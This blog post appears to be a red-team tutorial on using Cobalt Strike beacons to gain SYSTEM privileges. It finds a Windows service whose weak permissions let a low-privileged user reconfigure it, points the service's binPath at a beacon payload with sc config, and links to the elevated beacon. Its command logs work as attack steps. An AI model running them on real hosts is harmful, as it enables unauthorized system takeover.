---
title: "Cobalt strike abuse service for system privileges"
date: "2024-03-14"
layout: post
---

This scenario is based upon an assumed compromise with lower privileges and after doing some endpoint recon we find a service that allows us to configure an exe of our choosing.  It's a common technique to look for vulnerable or misconfigured services as they tend to run with higher privileges.  Assuming you get passed EDR with the assumed compromised some of these techniques can be noisy but are TTPs threat actors employ. I'm using Cobalt as my C2 of choice but these techniques can be leveraged with plent of other popular C2 frameworks.


We'll need two listeners for this scenario (http & tcp).  The http listener is tied to the initial compromise and we'll use the beacon_bind_tcp as the second listener which will aid in elevating our privileges.  Below are my settings for both http and tcp listeners with cobalt.

![blah](/assets/http.png)

![blah](/assets/tcp-local.png)

Once on the compromised endpoint we can run a tool such as SharpUp to determine any priv esc opportunities.

```bash
[03/02 00:47:24] beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
[03/02 00:47:25] [*] Tasked beacon to run .NET program: SharpUp.exe audit
[03/02 00:47:25] [+] host called home, sent: 149254 bytes
[03/02 00:47:26] [+] received output:

=== Modifiable Service Binaries ===
	Service 'VulnService1' (State: Running, StartMode: Auto) : C:\Program Files\Vulnerable Services\Service.exe
```

So SharpUp identifed a service where we can modify the service binary but doesn't show exactly what the permissions are so we need to dig a little deeper.  We can leverage a powershell script to see what service rights we have.

```bash
[03/02 01:21:24] beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
[03/02 01:21:24] [*] Tasked beacon to import: C:\Tools\Get-ServiceAcl.ps1
[03/02 01:21:24] [+] host called home, sent: 2156 bytes
[03/02 01:21:46] beacon> powershell Get-ServiceAcl -Name VulnService | select -expand Access
[03/02 01:21:46] [*] Tasked beacon to run: Get-ServiceAcl -Name VulnService2 | select -expand Access
[03/02 01:21:46] [+] host called home, sent: 425 bytes
[03/02 01:21:50] [+] received output:

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
```

We can see that all Authenticated Users have ChangeConfig, Start and Stop privileges over this service. We can abuse these weak permissions by changing the binary path of the service.  So instead of it running C:\Program Files\Vulnerable Services\Service.exe we can have it run something like C:\Temp\payload.exe.  If you haven't already go into Cobalt and create the tcp payload that leverages the tcp listener.  Next we'll configure the service to use our payload versus the service executable of the original service.

```bash
beacon> upload C:\Payloads\tcp-local.exe
beacon> run sc config VulnService binPath= C:\Temp\tcp-localexe
beacon> run sc qc VulnService
```

You may need to stop and start the service so keep that in mind.  Once the service is up and running with payload we pointed it too we can then connect to our localhost to hopefully have a beacon with elevated prvileges.

```bash
[03/02 01:36:36] beacon> connect localhost 4444
[03/02 01:36:36] [*] Tasked to connect to localhost:4444
[03/02 01:36:36] [+] host called home, sent: 20 bytes
[03/02 01:36:36] [+] established link to child beacon: 10.10.123.102
```

![blah](/assets/system-privs.png)

We can see from the screenshot that we were succesful in obtaing a call back with system privileges.
